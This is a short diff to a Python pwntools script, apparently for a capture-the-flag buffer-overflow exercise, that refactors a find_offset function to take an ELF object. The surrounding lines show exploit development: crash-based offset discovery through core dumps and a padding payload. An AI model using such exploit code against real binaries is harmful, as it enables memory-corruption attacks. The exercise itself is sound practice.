@@ -23,7 +23,7 @@ def exploit(binary_path):
     with process(elf.path) as io:
 
         # Get the offset by calling the find_offset() function
-        offset = find_offset(binary_path)
+        offset = find_offset(elf)
 
         # Construct the payload
         payload = b'\x69' * offset
@@ -45,7 +45,7 @@ def find_cyclic_pattern(io):
     # Return the core file
     return io.corefile
 
-def find_offset(binary_path):
+def find_offset(elf):
 
     # Save the original log level which would be either 'info' or 'debug'
     log_level = context.log_level
@@ -55,9 +55,6 @@ def find_offset(binary_path):
 
      # Record a memory crash in the Core_Dumps subdirectory
     try:
-
-        # Create an ELF object and start a new process for offset calculations
-        elf = context.binary = ELF(binary_path)
 
         # Create a directory called 'Core_Dumps' if it does not already exist
         if not os.path.exists('Core_Dumps'):
